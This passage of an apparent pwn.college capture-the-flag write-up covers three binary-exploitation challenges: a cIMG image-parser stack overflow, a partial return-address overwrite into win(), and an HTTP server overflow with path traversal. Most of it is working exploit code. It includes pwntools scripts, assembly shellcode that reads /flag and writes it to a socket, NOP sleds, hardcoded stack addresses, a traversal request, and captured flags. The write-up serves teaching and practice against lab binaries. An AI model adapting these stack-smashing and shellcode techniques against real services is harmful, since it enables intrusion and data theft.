shellcode_asm = """
    /* chmod("/flag", 0o777) */
    lea rdi, [rip + flag_str]
    mov esi, 0x1ff
    push 90
    pop rax
    syscall

    /* exit(0) */
    xor edi, edi
    push 60
    pop rax
    syscall

flag_str:
    .string "/flag"
"""

sc = asm(shellcode_asm)
nops = b'\x90' * (168 - len(sc))
ret_addr = struct.pack("<Q", 0x7fffffffda00)
payload  = nops + sc + ret_addr
assert len(payload) == 176

with open('/tmp/exploit.bin', 'wb') as f:
    f.write(payload)

# Build the header (12 bytes total)
magic = b"cIMG"                                         # 4 bytes
version  = struct.pack("<H", 4)                         # 2 bytes
width = struct.pack("<B", CANVAS_W)                     # 1 byte
height = struct.pack("<B", CANVAS_H)                    # 1 byte
remaining_directives = struct.pack("<I", DIRECTIVES)    # 4 bytes

header = magic + version + width + height + remaining_directives

# Build directives
path = b'/tmp/exploit.bin\x00'
record5 = bytes([0, 176, 1]) + path
record5 = record5.ljust(258, b'\x00')
d5 = struct.pack("<H", 0x0005) + record5

d4 = struct.pack("<H", 0x0004) + bytes([0, 0, 0, 0, 0, 0, 1, 1, 0xce])
d1337 = struct.pack("<H", 0x0539) + bytes([1, 0, 0, 176, 1])

# Full file content
cimg_data = header + d5 + d4 + d1337

# Write to disk
filename = "/tmp/exploit.cimg"
with open(filename, "wb") as f:
    f.write(cimg_data)

print(f"Wrote {len(cimg_data)} bytes: {cimg_data} to: {filename}")

subprocess.run(['/challenge/integration-cimg-screenshot-sc', filename])
```

```
hacker@integrated-security~integration-cimg-screenshot-sc:~$ python3 ~/script.py
hacker@integrated-security~integration-cimg-screenshot-sc:~$ cat /flag
pwn.college{sQ1MyWTyt3UmOI91I2-7M6WXHRl.QXxYDMxEDL4ITM0EzW}
```

&nbsp;

## cIMG Screenshots 2

### Binary Analysis

```
hacker@integrated-security~integration-cimg-screenshot-win:~$ checksec /challenge/integration-cimg-screenshot-win
[*] '/challenge/integration-cimg-screenshot-win'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stack:      No exec
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

This is the NX variant of the cIMG screenshot challenge. The format, canvas, and handle_1337 stack overflow are identical to the shellcode variant, but there is no `handle_5`, the stack is non-executable, and ASLR is enabled.

**Differences from the shellcode variant:**
- No `handle_5` (the file-loading handler) — only handle_1, 2, 3, 4, 6, 7 and handle_1337 exist.
- `handle_1/2/3` all validate every pixel's char byte to the printable range 0x20–0x7e before writing to the canvas. There is no mechanism to write non-printable bytes into the canvas.
- NX enabled: shellcode on the stack cannot be executed.
- ASLR enabled: no `disable_aslr()` constructor as in the shellcode variant.
- `win()` at `0x401576`: reads `/flag` and outputs its contents.

### Key Observations

**handle_1 (opcode 0x0001)** reads `4 × canvas_w × canvas_h` bytes from the `.cimg` stream. Each entry is a 4-byte pixel `[R, G, B, char]`. The `char` byte (offset 3) is validated (must be 0x20–0x7e) and written directly to the canvas framebuffer at pixel offset 19 of each pixel's ANSI escape. No sprite struct is involved; handle_1 renders directly to canvas.

**handle_1337 partial overwrite**: with `width=170`, the screenshot loop copies pixels 0–169 to output buffer positions 0–169. Positions 170–175 retain their original stack values. The return address is at buffer[168–175]. With the original return address being `0x4013FF` (LE: `[FF, 13, 40, 00, 00, 00, 00, 00]`), bytes 170–175 stay as `[0x40, 0x00, 0x00, 0x00, 0x00, 0x00]`. Setting pixels 168 and 169 to printable values `A` and `B` gives a return address `0x004000_B_A`.

**Printability constraint**: since all char bytes are 0x20–0x7e, the two overwritten return address bytes must both be printable. This limits reachable targets to addresses `0x40XXYY` where `XX, YY ∈ {0x20..0x7e}`, all within `win()`, which spans `0x401576`–`0x41116d`.

**The problem with `win()` sub-instances**: every repeated open/read/write block inside `win()` past the first one does `read(fd, rbp, 256)` without setting up `rbp` first. `rbp` at this point comes from `handle_1337()`'s saved frame and is garbage (all printable bytes, not a valid address). However, one particular success path inside `win()` is different.

**0x403b42 — the pivot**: this address (LE: `[0x42, 0x3b, 0x40, ...]`, bytes 'B' and ';' — both printable) is the success branch after a `read()` inside `win()`'s repeating loop. Its first instruction is:

```asm
403b42:  48 89 e5   mov %rsp, %rbp    ; rbp = rsp (valid stack pointer!)
403b45:  48 63 d0   movslq %eax,%rdx
403b48:  bf 01 00 00 00  mov $0x1,%edi
403b4d:  48 89 ee   mov %rbp,%rsi
403b50:  call write@plt                ; write(1, rsp, rdx) — dumps some stack bytes
403b55:  ...
403b61:  lea ["/flag"], rdi
403b6a:  xor esi, esi
403b6c:  call open@plt                 ; open("/flag", 0) → fd
403b71:  mov eax, edi
403b75:  jns 403bab                    ; if fd >= 0 → success
...
403bab:  mov $0x100, edx
403bb0:  mov rbp, rsi                  ; rsi = rbp = rsp (valid stack!)
403bb3:  call read@plt                 ; read(fd, rsp, 256) → flag on stack
403bb8:  test eax, eax
403bba:  jg 403be6                     ; if bytes_read > 0 → write flag
...
403be6:  movslq eax, rdx
403be9:  mov rbp, rsi
403bec:  mov $0x1, edi
403bf1:  call write@plt                ; write(1, rsp, bytes_read) → FLAG!
```

When jumped to directly from `handle_1337()`'s `ret`:
1. `mov rsp, rbp` sets rbp to the CURRENT stack pointer (main's rsp, a valid writable address).
2. An initial `write(1, rsp, rdx)` with `rdx` from handle_1337's leftover `eax` (harmless — likely 0 or small).
3. `open("/flag", 0)` returns a valid fd.
4. `read(fd, rbp=rsp, 256)` reads the flag onto the stack.
5. `write(1, rbp=rsp, bytes_read)` outputs the flag.

The `win()` loop then repeats indefinitely, printing the flag many times.

### Exploit

```python title="~/script.py" showLineNumbers
#!/usr/bin/env python3
from pwn import *
import struct
import subprocess

CANVAS_W = 200
CANVAS_H = 1
DIRECTIVES = 2

# Target 0x403b42: "mov rsp,rbp" entry in win() loop
# Partial overwrite with width=170: pixels 168,169 → ret addr bytes 0,1;
# bytes 170-175 stay as original [0x40, 0x00, ...] from return to main
# => [0x42, 0x3b, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00] = 0x403b42

# handle_1 reads 4*200*1 = 800 bytes: [R,G,B,char] per pixel
# char byte (offset 3) validated 0x20-0x7e, written directly to canvas
pixel_data = b''
for i in range(CANVAS_W):
    if i == 168:
        c = 0x42   # 'B' — ret addr byte 0
    elif i == 169:
        c = 0x3b   # ';' — ret addr byte 1
    else:
        c = 0x41   # 'A' filler (printable)
    pixel_data += bytes([0x41, 0x41, 0x41, c])

assert len(pixel_data) == 800

# Build the header (12 bytes total)
magic = b"cIMG"                                             # 4 bytes
version = struct.pack("<H", 4)                              # 2 bytes
width = struct.pack("<B", CANVAS_W)                         # 1 byte
height = struct.pack("<B", CANVAS_H)                        # 1 byte
remaining_directives = struct.pack("<I", DIRECTIVES)        # 4 bytes

header = magic + version + width + height + remaining_directives

# Build directives
d1 = struct.pack("<H", 0x0001) + pixel_data
d1337 = struct.pack("<H", 0x0539) + bytes([1, 0, 0, 170, 1])

# Full file content
cimg_data = header + d1 + d1337

# Write to disk
filename = "/tmp/win2.cimg"
with open(filename, "wb") as f:
    f.write(cimg_data)

print(f"Wrote {len(cimg_data)} bytes: {cimg_data} to: {filename}")

subprocess.run(['/challenge/integration-cimg-screenshot-win', filename])
```

```
hacker@integrated-security~integration-cimg-screenshot-win:~$ python3 ~/win_exploit2.py
...
pwn.college{wj1Qz7XQTeBxj6-rTwrVdzyrKNU.QXyYDMxEDL4ITM0EzW}
```

&nbsp;

## Web Overflow

### Binary Analysis

```
hacker@integrated-security~integration-web-overflow:~$ checksec /challenge/integration-web-overflow
[*] '/challenge/integration-web-overflow'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

No canary, no PIE, executable stack. ASLR is disabled at runtime by a constructor.

```c title="/challenge/integration-web-overflow.c" showLineNumbers
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

void __attribute__((constructor)) disable_aslr(int argc, char **argv, char **envp)
{
    int current_personality = personality(0xffffffff);
    assert(current_personality != -1);
    if ((current_personality & ADDR_NO_RANDOMIZE) == 0)
    {
        assert(personality(current_personality | ADDR_NO_RANDOMIZE) != -1);
        assert(prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != -1);
        execve("/proc/self/exe", argv, envp);
    }
}

#define HTTP_ERROR(y) "HTTP/1.1 " #y "\n\n"
#define REQUIRE(x, y) if (!(x)) { \
    write(client_fd, HTTP_ERROR(y), sizeof(HTTP_ERROR(y))-1); \
    write(client_fd, HTTP_ERROR(y), sizeof(HTTP_ERROR(y))-1); \
    return; \
  }

void send_file(int client_fd, char *path)
{
    struct response_t
    {
        char *head;
        char content[8192];
    } response = { 0 };
    response.head = response.content;

    int file_fd = open(path, O_RDONLY);
    REQUIRE(file_fd > 2, 404);

    struct stat file_stat;
    fstat(file_fd, &file_stat);

    REQUIRE(S_ISREG(file_stat.st_mode), 400)
    REQUIRE(file_stat.st_size < 8192, 413)

    response.head += sprintf(response.head, "HTTP/1.1 200 OK\nServer: pwnserver/1.3333333333333.7\nX-Leetness-Level: 9001\nContent-type: ");
    if (!strrchr(path, '.')) response.head += sprintf(response.head, "text/plain\n");
    else if (strcmp(strrchr(path, '.')+1, "html") == 0) response.head += sprintf(response.head, "text/html\n");
    else if (strcmp(strrchr(path, '.')+1, "jpg") == 0) response.head += sprintf(response.head, "image/jpeg\n");
    else if (strcmp(strrchr(path, '.')+1, "png") == 0) response.head += sprintf(response.head, "image/png\n");
    else response.head += sprintf(response.head, "text/plain\n");
    response.head += sprintf(response.head, "Content-Length: %d\n", file_stat.st_size);
    response.head += sprintf(response.head, "\n");
    response.head += read(file_fd, response.head, file_stat.st_size);
    REQUIRE(!strstr(response.content, "pwn.college{"), 403);
    write(client_fd, response.content, response.head-response.content);
    close(file_fd);

}

void handle_connection(int client_fd)
{
    char request[8192] = { 0 };
    char method[8] = { 0 };
    char version[10] = { 0 };
    char path[256] = { 0 };
    char resolved_path[512] = { 0 };

    read(client_fd, request, 1000);
    sscanf(request, "%7s %255s %9s", method, path, version);

    REQUIRE(strcmp(method, "GET") == 0, 501);
    REQUIRE(strcmp(version, "HTTP/1.1") == 0, 400);
    sprintf(resolved_path, "/challenge/files/%s", path);
    send_file(client_fd, resolved_path);
}

int challenge(int argc, char **argv, char **envp)
{
    int server_fd;
    struct sockaddr_in server_addr;
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    int option = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &option, sizeof(option));
    assert(server_fd > 0);
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(80);
    assert(bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) >= 0);
    assert(listen(server_fd, 10) >= 0);

    puts("Listening on port 80.");

    while (1)
    {
        struct sockaddr_in client_addr;
        socklen_t client_addr_len = sizeof(client_addr);
        int client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_addr_len);
        handle_connection(client_fd);
        close(client_fd);
    }
}

int main(int argc, char **argv, char **envp)
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    challenge(argc, argv, envp);

}
```

### Vulnerability

`send_file()` builds an HTTP response in a local `content[8192]` buffer. It first writes ~122 bytes of headers, then calls `read(file_fd, response.head, file_stat.st_size)` to append the file. Since `file_stat.st_size` can be up to 8191 bytes and 122 bytes of headers have already been written, the total written is up to 8313 bytes into an 8192-byte buffer, a **123-byte overflow** past the end of `content[]`.

The overflowed bytes clobber:
- 4 bytes of padding
- `file_fd` at `rbp-0x4`
- saved RBP at `rbp+0x0`
- return address at `rbp+0x8`

### Stack Layout

From disassembly:

```
send_file frame size: 0x20b0 (8368 bytes)

rbp - 0x20b0  : bottom of frame (RSP)
rbp - 0x2010  : response.head  (char*, 8 bytes)
rbp - 0x2008  : response.content[0]
rbp - 0x2008
+ 8191        : end of content[]
rbp - 0x0004  : file_fd  (int, 4 bytes)
rbp + 0x0000  : saved RBP
rbp + 0x0008  : return address  ← target
```

`response.content[0]` is at `rbp-0x2008`, so the return address slot is at offset `0x2008 + 8 = 0x2010 = 8208` from `content[0]`.

The file content starts at `content[122]` (after 122 bytes of HTTP headers). So the return address corresponds to **file byte `8208 - 122 = 8086`**.

### Path Traversal

The server constructs `resolved_path = "/challenge/files/" + path`. Sending `GET /../../../tmp/exploit.bin` makes `resolved_path = "/challenge/files/../../../tmp/exploit.bin"`, which the kernel resolves to `/tmp/exploit.bin`. This lets us serve an arbitrary file from `/tmp`.

The `strstr(response.content, "pwn.college{")` check is bypassed because our file contains shellcode and NOPs, not the flag string.

### fd Accounting

```
server_fd = 3  (opened in challenge(), stays open)
client_fd = 4  (from accept() in challenge())
file_fd   = 5  (opened in send_file(), closed before ret)
```

`close(client_fd)` is in `challenge()`, called **after** `handle_connection()` returns. Our hijacked `ret` skips that return, so **fd 4 (client socket) is still open** when our shellcode runs. After `close(file_fd)`, fd 5 is freed, so `open("/flag")` reuses it as fd 5.

### Shellcode

The shellcode opens `/flag`, reads it, then writes to fd 4 (the client socket) so the flag appears in the HTTP response, and also writes it to `/tmp/flag_out` as a fallback.

```python
shellcode_asm = """
    /* open("/flag", 0) */
    lea  rdi, [rip + flag_str]
    xor  esi, esi
    push 2
    pop  rax
    syscall

    /* read(fd, buf, 256) */
    push rax
    pop  rdi
    lea  rsi, [rip + buf]
    mov  edx, 0x100
    xor  eax, eax
    syscall
    mov  r15d, eax

    /* write(4, buf, n) — fd 4 = client socket */
    push 4
    pop  rdi
    lea  rsi, [rip + buf]
    mov  edx, r15d
    push 1
    pop  rax
    syscall

    /* creat("/tmp/flag_out", 0644) and write there */
    lea  rdi, [rip + out_str]
    mov  esi, 0x1a4
    push 85
    pop  rax
    syscall
    push rax
    pop  rdi
    lea  rsi, [rip + buf]
    mov  edx, r15d
    push 1
    pop  rax
    syscall

    /* exit(0) */
    xor  edi, edi
    push 60
    pop  rax
    syscall

flag_str:
    .string "/flag"
out_str:
    .string "/tmp/flag_out"
buf:
    .zero 256
"""
```

### Stack Address Calculation

ASLR is disabled by the constructor, so the stack layout is deterministic. We compile a probe binary that mirrors the exact frame sizes from the real binary's disassembly:

| Function | Frame size (from `sub` instructions) |
|---|---|
| `main` | `0x20` |
| `challenge` | `0x70` |
| `handle_connection` | `0x2330` (`0x1000 + 0x1000 + 0x330`) |
| `send_file` | `0x20b0` (`0x1000 + 0x1000 + 0xb0`) |

The probe reads RBP directly via inline assembly in a function positioned at the same call-chain depth as `send_file`:

```c
__attribute__((noinline)) void sf_mirror(void) {
    uint64_t rbp;
    __asm__ volatile ("movq %%rbp, %0" : "=r"(rbp));
    printf("content[0]= %lx\n", rbp - 0x2008);
}
__attribute__((noinline)) void hc_mirror(void) {
    __asm__ volatile ("subq $0x2330, %%rsp\n\t" ::: "memory");
    sf_mirror();
    __asm__ volatile ("addq $0x2330, %%rsp\n\t" ::: "memory");
}
// ... ch_mirror (sub 0x70), main (sub 0x20) ...
```

Three consistent runs give: **`content[0] = 0x7fffffffa728`**.

```
NOP sled:    content[122..6121]   → addresses 0x7fffffffa7a2..0x7fffffffbd49
Sled center: content[3122]        → 0x7fffffffb35a
RET_ADDR   = 0x7fffffffa728 + 122 + 3000 = 0x7fffffffb35a
```

### Payload Layout

```
File bytes 0    – 5999  : 0x90 NOP sled (6000 bytes)
File bytes 6000 – 6369  : shellcode    (370 bytes)
File bytes 6370 – 8085  : 'A' padding  (1716 bytes)
File bytes 8086 – 8093  : p64(0x7fffffffb35a)  ← overwrites return address
File bytes 8094 – 8190  : 'B' padding  (97 bytes)
Total: 8191 bytes
```

### Exploit

```python title="exploit.py" showLineNumbers
#!/usr/bin/env python3
from pwn import *
import socket, time, subprocess, re

context.arch = 'amd64'
context.os   = 'linux'

shellcode_asm = """
    lea  rdi, [rip + flag_str]
    xor  esi, esi
    push 2
    pop  rax
    syscall
    push rax
    pop  rdi
    lea  rsi, [rip + buf]
    mov  edx, 0x100
    xor  eax, eax
    syscall
    mov  r15d, eax
    push 4
    pop  rdi
    lea  rsi, [rip + buf]
    mov  edx, r15d
    push 1
    pop  rax
    syscall
    xor  edi, edi
    push 60
    pop  rax
    syscall
flag_str:
    .string "/flag"
buf:
    .zero 256
"""

sc = asm(shellcode_asm)

CONTENT0   = 0x7fffffffa728   # rbp_sf - 0x2008, from inline-asm probe
HDR_SIZE   = 122               # exact HTTP header byte count
RET_FILE   = 0x2010 - HDR_SIZE # = 8086: file byte that lands on return address
NOP_LEN    = 6000
RET_ADDR   = CONTENT0 + HDR_SIZE + NOP_LEN // 2   # middle of NOP sled

payload  = b'\x90' * NOP_LEN
payload += sc
payload  = payload.ljust(RET_FILE, b'A')
payload += p64(RET_ADDR)
payload  = payload.ljust(8191, b'B')

assert len(payload) == 8191

with open('/tmp/exploit.bin', 'wb') as f:
    f.write(payload)

subprocess.run(['pkill', '-f', 'integration-web-overflow'], capture_output=True)
time.sleep(0.3)
subprocess.Popen(['/challenge/integration-web-overflow'],
                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(0.5)

req = (b'GET /../../../tmp/exploit.bin HTTP/1.1\r\n'
       b'Host: localhost\r\n'
       b'Connection: close\r\n\r\n')
s = socket.socket()
s.settimeout(8)
s.connect(('127.0.0.1', 80))
s.sendall(req)

resp = b''
try:
    while True:
        d = s.recv(4096)
        if not d:
            break
        resp += d
except socket.timeout:
    pass
s.close()

m = re.search(b'pwn\\.college\\{[^}]+\\}', resp)
if m:
    print(f'[+] FLAG: {m.group(0).decode()}')
```

```
[*] shellcode size = 370 bytes
[*] server PID 19696
[*] response = 8373 bytes
[+] FLAG: pwn.college{IfJLlBKNExRa6KcB0xygNI4ERm8.QXzYDMxEDL4ITM0EzW}
```

The response grew from 8313 to 8373 bytes — the extra 60 bytes are the flag written to fd 4 by the shellcode after `ret`.
